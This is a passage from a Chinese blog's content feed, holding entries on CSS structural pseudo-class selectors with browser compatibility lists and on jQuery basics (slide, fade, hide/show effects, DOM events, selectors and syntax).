data-cell-id="9287-1563161659071-cell-0-1"><div>p::first-letter&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;float:&nbsp;left;</div><div>&nbsp;&nbsp;&nbsp;font-size:&nbsp;2em;</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>&nbsp;&nbsp;&nbsp;font-family:&nbsp;cursive;</div><div>&nbsp;&nbsp;&nbsp;padding-right:&nbsp;2px;</div><div>}</div></td></tr></tbody></table><p>上面这段代码会找到页面上所有段落，并且指定为每一段的第一个字。</p><p>它通常在一些新闻报刊内容的重点突出会使用到。</p><p>定位某段的第一行</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="3988-1563161659071-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div></td><td data-cell-id="3988-1563161659071-cell-0-1"><div>p::first-line&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>&nbsp;&nbsp;&nbsp;font-size:&nbsp;1.2em;</div><div>}</div></td></tr></tbody></table><p>跟`::first-line`相似，会选中段落的第一行 。</p><p>为了兼容性，之前旧版浏览器也会兼容单冒号的写法，例如`:first-line`,`:first-letter`,`:before`,`:after`.但是这个兼容对新介绍的特性不起作用。</p><p>DEMO</p><p>兼容性</p><ul><li>IE6+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>22. X:nth-child(n)</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2470-1563161659072-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="2470-1563161659072-cell-0-1"><div>li:nth-child(3)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>还记得我们面对如何取到推跌式标签的第几个元素是无处下手的时光么，有了`nth-child`那日子就一去不复返了。</p><p>请注意`nth-child`接受一个整形参数，然后它不是从0开始的。如果你想获取第二个元素那么你传的值就是`li:nth-child(2)`.</p><p>我们甚至可以获取到由变量名定义的个数个子标签。例如我们可以用`li:nth-child(4n)`去每隔3个元素获取一次标签。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox3.5+</li><li>Chrome</li><li>Safari</li></ul><p>23. X:nth-last-child(n)</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="8170-1563161659072-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="8170-1563161659072-cell-0-1"><div>li:nth-last-child(2)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>假设你在一个`ul`标签中有N多的元素，而你只想获取最后三个元素，甚至是这样`li:nth-child(397)`，你可以用`nth-last-child`伪类去代替它。</p><p>这个技巧可以很正确的代替第16个TIP，不同的就是它是从结尾处开始的，倒回去的。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox3.5+</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>24. X:nth-of-type(n)</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1942-1563161659072-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="1942-1563161659072-cell-0-1"><div>ul:nth-of-type(3)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>曾几何时，我们不想去选择子节点，而是想根据元素的类型来进行选择。</p><p>想象一下有5个`ul`标签。如果你只想对其中的第三个进行修饰，而且你也不想使用`id`属性，那你就可以使用`nth-of-type(n)`伪类来实现了，上面的那个代码，只有第三个`ul`标签会被设置边框。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox3.5+</li><li>Chrome</li><li>Safari</li></ul><p>25. X:nth-last-of-type(n)</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="8246-1563161659072-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="8246-1563161659072-cell-0-1"><div>ul:nth-last-of-type(3)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;border:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>}</div></td></tr></tbody></table><p>同样，也可以类似的使用`nth-last-of-type`来倒序的获取标签。</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox3.5+</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>26. X:first-child</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="8812-1563161659072-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="8812-1563161659072-cell-0-1"><div>ul&nbsp;li:first-child&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;border-top:&nbsp;none;</div><div>}</div></td></tr></tbody></table><p>这个结构性的伪类可以选择到第一个子标签，你会经常使用它来取出第一个和最后一个的边框。</p><p>假设有个列表，没个标签都有上下边框，那么效果就是第一个和最后一个就会看起来有点奇怪。这时候就可以使用这个伪类来处理这种情况了。</p><p>DEMO</p><p>兼容性</p><ul><li>IE7+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>27. X:last-child</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="5037-1563161659073-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="5037-1563161659073-cell-0-1"><div>ul&nbsp;&gt;&nbsp;li:last-child&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;green;</div><div>}</div></td></tr></tbody></table><p>跟`first-child`相反，`last-child`取的是父标签的最后一个标签。</p><p>例如</p><p>标签</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9096-1563161659073-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div></td><td data-cell-id="9096-1563161659073-cell-0-1"><div>&lt;ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;&lt;/li&gt;</div><div>&lt;/ul&gt;</div></td></tr></tbody></table><p>这里没啥内容，就是一个了 List。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9155-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div></td><td data-cell-id="9155-1563161659074-cell-0-1"><div>ul&nbsp;{</div><div>&nbsp;width:&nbsp;200px;</div><div>&nbsp;background:&nbsp;#292929;</div><div>&nbsp;color:&nbsp;white;</div><div>&nbsp;list-style:&nbsp;none;</div><div>&nbsp;padding-left:&nbsp;0;</div><div>}</div><div></div><div>li&nbsp;{</div><div>&nbsp;padding:&nbsp;10px;</div><div>&nbsp;border-bottom:&nbsp;1px&nbsp;solid&nbsp;black;</div><div>&nbsp;border-top:&nbsp;1px&nbsp;solid&nbsp;#3c3c3c;</div><div>}</div></td></tr></tbody></table><p>上面的代码将设置背景色，移除浏览器默认的内边距，为每个`li`设置边框以凸显一定的深度。</p><p><img src="images/sysbussy.jpeg"></p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>28. X:only-child</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9895-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="9895-1563161659074-cell-0-1"><div>div&nbsp;p:only-child&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;color:&nbsp;red;</div><div>}</div></td></tr></tbody></table><p>说实话，你会发现你几乎都不会用到这个伪类。然而，它是可用的，有会需要它的。</p><p>它允许你获取到那些只有一个子标签的父标签。就像上面那段代码，只有一个段落标签的`div`才被着色。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1665-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></td><td data-cell-id="1665-1563161659074-cell-0-1"><div>&lt;div&gt;&lt;p&gt;&nbsp;My&nbsp;paragraph&nbsp;here.&nbsp;&lt;/p&gt;&lt;/div&gt;</div><div></div><div>&lt;div&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;p&gt;&nbsp;Two&nbsp;paragraphs&nbsp;total.&nbsp;&lt;/p&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;p&gt;&nbsp;Two&nbsp;paragraphs&nbsp;total.&nbsp;&lt;/p&gt;</div><div>&lt;/div&gt;</div></td></tr></tbody></table><p>上面例子中，第二个`div`不会被选中。一旦第一个`div`有了多个子段落，那这个就不再起作用了。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>29. X:only-of-type</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1084-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="1084-1563161659074-cell-0-1"><div>li:only-of-type&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>}</div></td></tr></tbody></table><p>结构性伪类可以用的很聪明。它会定位某标签只有一个子标签的目标。设想你想获取到只有一个子标签的`ul`标签？</p><p>使用`ul li`会选中所有`li`标签。这时候就要使用`only-of-type`了。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="4977-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="4977-1563161659074-cell-0-1"><div>ul&nbsp;&gt;&nbsp;li:only-of-type&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>}</div></td></tr></tbody></table><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox 3.5+</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>30. X:first-of-type `first-of-type`伪类可以选择指定标签的第一个兄弟标签。</p><p>测试</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="7417-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div></td><td data-cell-id="7417-1563161659074-cell-0-1"><div>&lt;div&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;p&gt;&nbsp;My&nbsp;paragraph&nbsp;here.&nbsp;&lt;/p&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;1&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;2&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;/ul&gt;</div><div></div><div>&nbsp;&nbsp;&nbsp;&lt;ul&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;3&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;li&gt;&nbsp;List&nbsp;Item&nbsp;4&nbsp;&lt;/li&gt;</div><div>&nbsp;&nbsp;&nbsp;&lt;/ul&gt;</div><div>&lt;/div&gt;</div></td></tr></tbody></table><p>来你把List Item 2取出来，如果你已经取出来或者是放弃了，来继续。</p><p>解决办法1</p><p>办法很多，我们看一些比较方便的。首先是`first-of-type`。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="1766-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="1766-1563161659074-cell-0-1"><div>ul:first-of-type&nbsp;&gt;&nbsp;li:nth-child(2)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>}</div></td></tr></tbody></table><p>找到第一个`ul`标签，然后找到直接子标签`li`，然后找到第二个子节点。</p><p>解决办法2</p><p>另一个解决办法就是邻近选择器。</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="8018-1563161659074-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="8018-1563161659074-cell-0-1"><div>p&nbsp;+&nbsp;ul&nbsp;li:last-child&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>}</div></td></tr></tbody></table><p>这种情况下，找到`p`下的直接`ul`标签，然后找到它的最后一个直接子标签。</p><p>解决办法3</p><p>我们可以随便玩耍这些选择器。来看看：</p><p>?</p><table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="2256-1563161659075-cell-0-0"><div>1</div><div>2</div><div>3</div></td><td data-cell-id="2256-1563161659075-cell-0-1"><div>ul:first-of-type&nbsp;li:nth-last-child(1)&nbsp;{</div><div>&nbsp;&nbsp;&nbsp;font-weight:&nbsp;bold;</div><div>}</div></td></tr></tbody></table><p>先获取到页面上第一个`ul`标签，然后找到最后一个子标签。</p><p>DEMO</p><p>兼容性</p><ul><li>IE9+</li><li>Firefox 3.5+</li><li>Chrome</li><li>Safari</li><li>Opera</li></ul><p>结论</p><p>如果你想向旧版本浏览器妥协，比如IE6，那你用这些新的选择器的时候还是得小心点。但别别让IE6组织你去学这些新的技能。那你就对自己太残忍了。记得多查查[兼容性列表](<a href="http://www.quirksmode.org/css/contents.html)%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8/[Dean">http://www.quirksmode.org/css/contents.html)，或者使用\[Dean</a> Edward’s excellent IE9.js script ](<a href="http://code.google.com/p/ie7-js/)%E6%9D%A5%E8%AE%A9%E4%BD%A0%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%B7%E6%9C%89%E8%BF%99%E4%BA%9B%E7%89%B9%E6%80%A7%E3%80%82">http://code.google.com/p/ie7-js/)来让你的浏览器具有这些特性。</a></p><p>第二个，使用向jQuery的时候，尽量使用原生的CSS3选择器。可能 活让你的代码跑的很快。这样选择器引擎就可以使用浏览器原生解析器，而不是选择器自己的。</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vs各图标含义</title>
    <link href="/2019/06/29/vs%E5%90%84%E5%9B%BE%E6%A0%87%E5%90%AB%E4%B9%89/index/"/>
    <url>/2019/06/29/vs%E5%90%84%E5%9B%BE%E6%A0%87%E5%90%AB%E4%B9%89/index/</url>
    
    <content type="html"><![CDATA[<p> </p><p>由于无法直接复制有道云笔记的图标，所以截成图片，如下：</p><p><img src="images/2019-07-08_203541.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vs各种图标含义</title>
    <link href="/2019/06/26/vs%E5%90%84%E7%A7%8D%E5%9B%BE%E6%A0%87%E5%90%AB%E4%B9%89/index/"/>
    <url>/2019/06/26/vs%E5%90%84%E7%A7%8D%E5%9B%BE%E6%A0%87%E5%90%AB%E4%B9%89/index/</url>
    
    <content type="html"><![CDATA[<p><img src="images/20180504160348534-166x300.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八区</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery 效果 - 滑动</title>
    <link href="/2019/06/24/jquery-%E6%95%88%E6%9E%9C-%E6%BB%91%E5%8A%A8/index/"/>
    <url>/2019/06/24/jquery-%E6%95%88%E6%9E%9C-%E6%BB%91%E5%8A%A8/index/</url>
    
    <content type="html"><![CDATA[<p> slideDown() 方法用于向下滑动元素。</p><p>$(selector).slideDown(speed,callback);</p><p>可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。</p><p>可选的 callback 参数是滑动完成后所执行的函数名称。</p><p>slideUp() 方法用于向上滑动元素。</p><p>$(selector).slideUp(speed,callback);</p><p>可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。</p><p>可选的 callback 参数是滑动完成后所执行的函数名称。</p><p>未完待续。。。。。。</p>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery 效果 - 淡入</title>
    <link href="/2019/06/22/jquery-%E6%95%88%E6%9E%9C-%E6%B7%A1%E5%85%A5/index/"/>
    <url>/2019/06/22/jquery-%E6%95%88%E6%9E%9C-%E6%B7%A1%E5%85%A5/index/</url>
    
    <content type="html"><![CDATA[<p>fadeIn() 用于淡入已隐藏的元素。语法：</p><p>$(selector).fadeIn(speed,callback);</p><p>可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。.</p><p>可选的 callback 参数是 fading 完成后所执行的函数名称。</p><p>fadeOut() 方法用于淡出可见元素</p><p>$(selector).fadeOut(speed,callback);</p><p>可选的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。</p><p>可选的 callback 参数是 fading 完成后所执行的函数名称。</p><p>fadeToggle() 方法可以在 fadeIn() 与 fadeOut() 方法之间进行切换。</p><p>如果元素已淡出，则 fadeToggle() 会向元素添加淡入效果。</p><p>如果元素已淡入，则 fadeToggle() 会向元素添加淡出效果。</p><p>$(selector).fadeToggle(speed,callback);</p><p>$(selector).fadeTo(speed,opacity,callback);</p><p>必需的 speed 参数规定效果的时长。它可以取以下值：”slow”、”fast” 或毫秒。</p><p>fadeTo() 方法中必需的 opacity 参数将淡入淡出效果设置为给定的不透明度（值介于 0 与 1 之间）。</p><p>可选的 callback 参数是该函数完成后所执行的函数名称。</p>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery 效果- 隐藏和显示</title>
    <link href="/2019/06/20/jquery-%E6%95%88%E6%9E%9C-%E9%9A%90%E8%97%8F%E5%92%8C%E6%98%BE%E7%A4%BA/index/"/>
    <url>/2019/06/20/jquery-%E6%95%88%E6%9E%9C-%E9%9A%90%E8%97%8F%E5%92%8C%E6%98%BE%E7%A4%BA/index/</url>
    
    <content type="html"><![CDATA[<p>通过 jQuery，可以使用 hide() 和 show() 方法来隐藏和显示 HTML 元素：+</p><p>例：</p><p>$(“#hide”).click(function(){ $(“p”).hide(); }); $(“#show”).click(function(){ $(“p”).show(); });</p><p>$(selector).hide(speed,callback);</p><p>$(selector).show(speed,callback);</p><p>可选的 speed 参数规定隐藏/显示的速度，可以取以下值：”slow”、”fast” 或毫秒。</p><p>可选的 callback 参数是隐藏或显示完成后所执行的函数名称。</p><p>可以使用 toggle() 方法来切换 hide() 和 show() 方法，例：</p><p>$(document).ready(function(){</p><p>$(“button”).click(function(){</p><p>$(“p”).toggle();</p><p>});</p><p>});</p>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery 事件</title>
    <link href="/2019/06/18/jquery-%E4%BA%8B%E4%BB%B6/index/"/>
    <url>/2019/06/18/jquery-%E4%BA%8B%E4%BB%B6/index/</url>
    
    <content type="html"><![CDATA[<p>页面对不同访问者的响应叫做事件。</p><p>事件处理程序指的是当 HTML 中发生某些事件时所调用的方法。</p><p>常见DOM 事件：</p><table><colgroup><col> <col> <col> <col></colgroup><tbody><tr><td data-cell-id="3180-1561777248386-cell-0-0"><div class="table-cell-line">鼠标事件</div></td><td data-cell-id="3180-1561777248386-cell-0-1"><div class="table-cell-line">键盘事件</div></td><td data-cell-id="3180-1561777248386-cell-0-2"><div class="table-cell-line">表单事件</div></td><td data-cell-id="3180-1561777248386-cell-0-3"><div class="table-cell-line">文档/窗口事件</div></td></tr><tr><td data-cell-id="3180-1561777248386-cell-1-0"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-click.html">click</a></div></td><td data-cell-id="3180-1561777248386-cell-1-1"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-keypress.html">keypress</a></div></td><td data-cell-id="3180-1561777248386-cell-1-2"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-submit.html">submit</a></div></td><td data-cell-id="3180-1561777248386-cell-1-3"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-load.html">load</a></div></td></tr><tr><td data-cell-id="3180-1561777248386-cell-2-0"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-dblclick.html">dblclick</a></div></td><td data-cell-id="3180-1561777248386-cell-2-1"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-keydown.html">keydown</a></div></td><td data-cell-id="3180-1561777248386-cell-2-2"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-change.html">change</a></div></td><td data-cell-id="3180-1561777248386-cell-2-3"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-resize.html">resize</a></div></td></tr><tr><td data-cell-id="3180-1561777248386-cell-3-0"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-mouseenter.html">mouseenter</a></div></td><td data-cell-id="3180-1561777248386-cell-3-1"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-keyup.html">keyup</a></div></td><td data-cell-id="3180-1561777248386-cell-3-2"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-focus.html">focus</a></div></td><td data-cell-id="3180-1561777248386-cell-3-3"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-scroll.html">scroll</a></div></td></tr><tr><td data-cell-id="3180-1561777248386-cell-4-0"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-mouseleave.html">mouseleave</a></div></td><td data-cell-id="3180-1561777248386-cell-4-1"></td><td data-cell-id="3180-1561777248386-cell-4-2"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-blur.html">blur</a></div></td><td data-cell-id="3180-1561777248386-cell-4-3"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-unload.html">unload</a></div></td></tr><tr><td data-cell-id="3180-1561777248386-cell-5-0"><div class="table-cell-line"><a href="https://www.runoob.com/jquery/event-hover.html">hover</a></div></td><td data-cell-id="3180-1561777248386-cell-5-1"></td><td data-cell-id="3180-1561777248386-cell-5-2"></td><td data-cell-id="3180-1561777248386-cell-5-3"></td></tr></tbody></table><p>click()该函数在用户点击html元素时执行</p><p>dblclick（）当双击元素时会发生dblclick事件</p><p>mouseenter() 当鼠标指针穿过元素时，会发生 mouseenter 事件</p><p>mouseleave() 当鼠标指针离开元素时，会发生 mouseleave 事件。</p><p>mousedown() 当鼠标指针移动到元素上方，并按下鼠标按键时，会发生 mousedown 事件。</p><p>mouseup() 当在元素上松开鼠标按钮时，会发生 mouseup 事件。</p><p>hover()</p><p>hover()方法用于模拟光标悬停事件。</p><p>当鼠标移动到元素上时，会触发指定的第一个函数(mouseenter);当鼠标移出这个元素时，会触发指定的第二个函数(mouseleave)。</p><p>例：$(“#p1”).hover( function(){ alert(“你进入了 p1!”); }, function(){ alert(“拜拜! 现在你离开了 p1!”); } );</p><p>focus() 当元素获得焦点时，发生 focus 事件。当通过鼠标点击选中元素或通过 tab 键定位到元素时，该元素就会获得焦点。</p><p>blur() 当元素失去焦点时，发生 blur 事件。</p><p><a href="https://www.runoob.com/jquery/jquery-events.html">https://www.runoob.com/jquery/jquery-events.html</a>键盘事件</p>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery选择器</title>
    <link href="/2019/06/17/jquery%E9%80%89%E6%8B%A9%E5%99%A8/index/"/>
    <url>/2019/06/17/jquery%E9%80%89%E6%8B%A9%E5%99%A8/index/</url>
    
    <content type="html"><![CDATA[<p>jQuery 选择器基于元素的 id、类、类型、属性、属性值等”查找”（或选择）HTML 元素。 基于已经存在的 CSS 选择器，除此之外，它还有一些自定义的选择器。</p><p>jQuery 中所有选择器都以美元符号开头：$()。</p><p>元素选择器（基于元素名选取元素）：</p><p>例：选择所有</p><p>元素：$(“p”)</p><p>#id 选择器（通过 HTML 元素的 id 属性选取指定的元素）：</p><p>例：$(“#test”)</p><p>.class 选择器（通过指定的 class 查找元素）：</p><p>例：$(“.test”)</p><table><colgroup><col> <col></colgroup><tbody><tr><td data-cell-id="6369-1561775768978-cell-0-0"><div class="table-cell-line">$("*")</div></td><td data-cell-id="6369-1561775768978-cell-0-1"><div class="table-cell-line">选取所有元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-1-0"><div class="table-cell-line">$(this)</div></td><td data-cell-id="6369-1561775768978-cell-1-1"><div class="table-cell-line">选取当前 HTML 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-2-0"><div class="table-cell-line">$("p.intro")</div></td><td data-cell-id="6369-1561775768978-cell-2-1"><div class="table-cell-line">选取 class 为 intro 的 &lt;p&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-3-0"><div class="table-cell-line">$("p:first")</div></td><td data-cell-id="6369-1561775768978-cell-3-1"><div class="table-cell-line">选取第一个 &lt;p&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-4-0"><div class="table-cell-line">$("ul li:first")</div></td><td data-cell-id="6369-1561775768978-cell-4-1"><div class="table-cell-line">选取第一个 &lt;ul&gt; 元素的第一个 &lt;li&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-5-0"><div class="table-cell-line">$("ul li:first-child")</div></td><td data-cell-id="6369-1561775768978-cell-5-1"><div class="table-cell-line">选取每个 &lt;ul&gt; 元素的第一个 &lt;li&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-6-0"><div class="table-cell-line">$("[href]")</div></td><td data-cell-id="6369-1561775768978-cell-6-1"><div class="table-cell-line">选取带有 href 属性的元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-7-0"><div class="table-cell-line">$("a[target='_blank']")</div></td><td data-cell-id="6369-1561775768978-cell-7-1"><div class="table-cell-line">选取所有 target 属性值等于 "_blank" 的 &lt;a&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-8-0"><div class="table-cell-line">$("a[target!='_blank']")</div></td><td data-cell-id="6369-1561775768978-cell-8-1"><div class="table-cell-line">选取所有 target 属性值不等于 "_blank" 的 &lt;a&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-9-0"><div class="table-cell-line">$(":button")</div></td><td data-cell-id="6369-1561775768978-cell-9-1"><div class="table-cell-line">选取所有 type="button" 的 &lt;input&gt; 元素 和 &lt;button&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-10-0"><div class="table-cell-line">$("tr:even")</div></td><td data-cell-id="6369-1561775768978-cell-10-1"><div class="table-cell-line">选取偶数位置的 &lt;tr&gt; 元素</div></td></tr><tr><td data-cell-id="6369-1561775768978-cell-11-0"><div class="table-cell-line">$("tr:odd")</div></td><td data-cell-id="6369-1561775768978-cell-11-1"><div class="table-cell-line">选取奇数位置的 &lt;tr&gt; 元素</div></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery语法</title>
    <link href="/2019/06/16/jquery%E8%AF%AD%E6%B3%95/index/"/>
    <url>/2019/06/16/jquery%E8%AF%AD%E6%B3%95/index/</url>
    
    <content type="html"><![CDATA[<p>jQuery 语法是通过选取 HTML 元素，并对选取的元素执行某些操作。</p><p>基础语法： $(selector).action()</p><ul><li>美元符号定义 jQuery</li><li>选择符（selector）”查询”和”查找” HTML 元素</li><li>jQuery 的 action() 执行对元素的操作</li></ul><p>实例:</p><ul><li>$(this).hide() - 隐藏当前元素</li><li>$(“p”).hide() - 隐藏所有 <p> 元素</p></li><li>$(“p.test”).hide() - 隐藏所有 class=”test” 的 <p> 元素</p></li><li>$(“#test”).hide() - 隐藏所有 id=”test” 的元素</li></ul><p>jQuery 入口函数:</p><p>$(document).ready(function(){     // 执行代码 }); 或者 $(function(){     // 执行代码 });</p><p>JavaScript 入口函数:</p><p>window.onload = function () { // 执行代码 }</p><p>jQuery 入口函数与 JavaScript 入口函数的区别：</p><ul><li> jQuery 的入口函数是在 html 所有标签(DOM)都加载之后，就会去执行。</li><li> JavaScript 的 window.onload 事件是等到所有内容，包括外部图片之类的文件加载完后，才会执行。</li></ul>]]></content>
    
    
    <categories>
      
      <category>jquery</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jQuery定义及引用方案</title>
    <link href="/2019/06/15/jQuery%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%BC%95%E7%94%A8%E6%96%B9%E6%A1%88/index/"/>
    <url>/2019/06/15/jQuery%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%BC%95%E7%94%A8%E6%96%B9%E6%A1%88/index/</url>
    
